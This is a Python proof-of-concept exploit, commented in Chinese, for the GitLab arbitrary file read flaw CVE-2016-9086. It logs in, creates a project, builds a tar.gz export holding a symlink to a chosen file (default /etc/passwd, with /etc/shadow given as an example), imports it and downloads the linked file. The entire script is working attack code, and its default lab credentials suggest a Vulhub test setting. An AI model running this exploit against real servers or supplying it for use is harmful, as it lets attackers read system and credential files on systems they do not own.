#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitLab 任意文件读取漏洞 (CVE-2016-9086) PoC
影响版本：GitLab 8.9.0 ~ 8.13.x
仅用于授权安全测试与教学研究，请勿用于非法用途。

原理：
  在导入 GitLab 导出包时，如果压缩包中包含符号链接，GitLab 未正确处理，
  会读取链接指向的任意文件内容并存储为项目文件，攻击者可通过项目文件路径访问文件内容。
"""

import argparse
import io
import re
import sys
import tarfile
import requests
from urllib.parse import urljoin

def login(session, target_url, username, password):
    """登录 GitLab，返回 True 或 (False, error)"""
    signin_url = urljoin(target_url, "/users/sign_in")
    # 获取 CSRF token
    resp = session.get(signin_url, timeout=10)
    if resp.status_code != 200:
        return False, f"无法访问登录页面，状态码 {resp.status_code}"
    # 提取 authenticity_token
    match = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
    if not match:
        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', resp.text)
    if not match:
        return False, "未找到 CSRF token"
    token = match.group(1)

    data = {
        "user[login]": username,
        "user[password]": password,
        "authenticity_token": token
    }
    resp = session.post(signin_url, data=data, allow_redirects=False)
    if resp.status_code in (302, 301):
        # 验证是否登录成功
        if "_gitlab_session" in session.cookies or "gitlab_user" in resp.text:
            return True, None
        else:
            return False, "登录失败，请检查用户名和密码"
    elif "Invalid" in resp.text:
        return False, "登录失败，凭证无效"
    else:
        return False, f"登录异常，状态码 {resp.status_code}"

def create_project(session, target_url, project_name):
    """创建一个新项目，返回项目的 namespace 和路径"""
    new_project_url = urljoin(target_url, "/projects/new")
    resp = session.get(new_project_url)
    token = ""
    match = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
    if match:
        token = match.group(1)
    else:
        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', resp.text)
        if match:
            token = match.group(1)
    if not token:
        return False, "创建项目页面未找到 CSRF token"

    data = {
        "project[name]": project_name,
        "authenticity_token": token,
        "project[visibility_level]": "20",  # 私有
    }
    resp = session.post(urljoin(target_url, "/projects"), data=data, allow_redirects=False)
    if resp.status_code in (301, 302):
        location = resp.headers.get("Location", "")
        # location 格式通常为 /root/test123
        if location:
            # 提取 namespace/project
            path = location.strip("/")
            return True, path
        else:
            return False, "创建成功但未获取到路径"
    elif resp.status_code == 200 and "Project was successfully created" not in resp.text:
        return False, "项目创建失败，可能已存在同名项目"
    else:
        # 尝试从响应体提取
        match = re.search(r'<a class="project-link" href="/([^"]+)"', resp.text)
        if match:
            return True, match.group(1)
        return False, f"项目创建异常，状态码 {resp.status_code}"

def generate_malicious_tar(target_file):
    """生成包含符号链接的恶意 tar.gz 包（内存中）"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        # 添加 VERSION 文件，标识导出包版本
        version_info = tarfile.TarInfo(name="VERSION")
        version_info.size = 5
        tar.addfile(version_info, io.BytesIO(b"8.13.1"))

        # 添加符号链接：uploads/passwd -> 目标文件
        symlink_name = "uploads/passwd"
        target = target_file
        tarinfo = tarfile.TarInfo(name=symlink_name)
        tarinfo.type = tarfile.SYMTYPE
        tarinfo.linkname = target
        tar.addfile(tarinfo)
    buf.seek(0)
    return buf

def import_project(session, target_url, project_path, tar_data):
    """导入 tar.gz 到指定项目，返回最终的导入项目路径"""
    import_url = urljoin(target_url, "/import/gitlab_project")
    # 获取导入页面 CSRF
    resp = session.get(import_url)
    token = ""
    match = re.search(r'name="authenticity_token" value="([^"]+)"', resp.text)
    if match:
        token = match.group(1)
    else:
        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', resp.text)
        if match:
            token = match.group(1)
    if not token:
        return False, "导入页面未找到 CSRF token"

    # 上传导入
    files = {
        "file": ("malicious.tar.gz", tar_data, "application/x-gzip")
    }
    data = {
        "authenticity_token": token,
        "name": project_path.split("/")[-1],  # 项目名
        "namespace_id": "",  # 留空可能使用默认，可尝试从项目路径解析
    }
    # 提交后，GitLab 会重定向到导入的项目页面
    resp = session.post(import_url, files=files, data=data, allow_redirects=False)
    if resp.status_code in (301, 302):
        location = resp.headers.get("Location", "")
        if location:
            return True, location.strip("/")
        else:
            return False, "导入重定向但未获取到路径"
    elif resp.status_code == 200 and "import" in resp.text:
        # 可能正在导入中，需等待，简化：尝试返回原始项目路径，因为导入可能覆盖
        return True, project_path
    else:
        return False, f"导入失败，状态码 {resp.status_code}"

def read_file(session, target_url, project_path, symlink_name="passwd"):
    """通过项目文件路径读取导入的符号链接文件内容"""
    # GitLab 上传文件的路径通常为 /namespace/project/uploads/filename
    file_url = urljoin(target_url, f"/{project_path}/uploads/{symlink_name}")
    resp = session.get(file_url)
    if resp.status_code == 200:
        return True, resp.text
    else:
        # 尝试 raw 模式
        raw_url = urljoin(target_url, f"/{project_path}/raw/master/uploads/{symlink_name}")
        resp = session.get(raw_url)
        if resp.status_code == 200:
            return True, resp.text
        return False, f"无法读取文件，状态码 {resp.status_code}"

def main():
    parser = argparse.ArgumentParser(
        description="GitLab 任意文件读取漏洞 (CVE-2016-9086) PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python poc.py -u http://192.168.1.1:8080\n"
            "  python poc.py -u http://target:8080 -U root -P vulhub123456 -f /etc/shadow\n"
        )
    )
    parser.add_argument("-u", "--url", required=True, help="GitLab 地址 (例如 http://target:8080)")
    parser.add_argument("-U", "--username", default="root", help="登录用户名 (默认: root)")
    parser.add_argument("-P", "--password", default="vulhub123456", help="登录密码 (默认: vulhub123456)")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="要读取的文件路径 (默认: /etc/passwd)")
    parser.add_argument("--timeout", type=int, default=15, help="请求超时秒数 (默认: 15)")
    parser.add_argument("--no-verify", action="store_true", help="禁用 SSL 证书验证")
    args = parser.parse_args()

    target_url = args.url.rstrip("/")
    verify_ssl = not args.no_verify

    session = requests.Session()
    session.verify = verify_ssl
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (CVE-2016-9086 PoC)"
    })

    # 1. 登录
    print(f"[*] 登录到 {target_url}，用户名: {args.username}")
    ok, err = login(session, target_url, args.username, args.password)
    if not ok:
        print(f"[-] 登录失败: {err}")
        sys.exit(1)
    print("[+] 登录成功")

    # 2. 创建临时项目
    project_name = f"poc_{args.username}_temp"
    print(f"[*] 创建项目: {project_name}")
    ok, project_path = create_project(session, target_url, project_name)
    if not ok:
        print(f"[-] 创建项目失败: {project_path}")
        sys.exit(1)
    print(f"[+] 项目创建成功: {project_path}")

    # 3. 生成恶意 tar.gz
    print(f"[*] 生成恶意导出包，符号链接指向: {args.file}")
    tar_data = generate_malicious_tar(args.file)

    # 4. 导入
    print("[*] 导入恶意导出包...")
    ok, imported_path = import_project(session, target_url, project_path, tar_data)
    if not ok:
        print(f"[-] 导入失败: {imported_path}")
        sys.exit(1)
    print(f"[+] 导入完成，项目路径: {imported_path}")

    # 5. 读取文件
    print("[*] 尝试读取目标文件内容...")
    # imported_path 可能是导入后生成的新路径（如果导入覆盖了原项目，路径不变）
    final_path = imported_path if imported_path else project_path
    ok, content = read_file(session, target_url, final_path)
    if ok:
        print("[+] 成功读取文件:")
        print("-" * 60)
        print(content)
        print("-" * 60)
    else:
        print(f"[-] 读取文件失败: {content}")

    # 可选：清理项目（略）
    print("[*] 漏洞利用完成")

if __name__ == "__main__":
    main()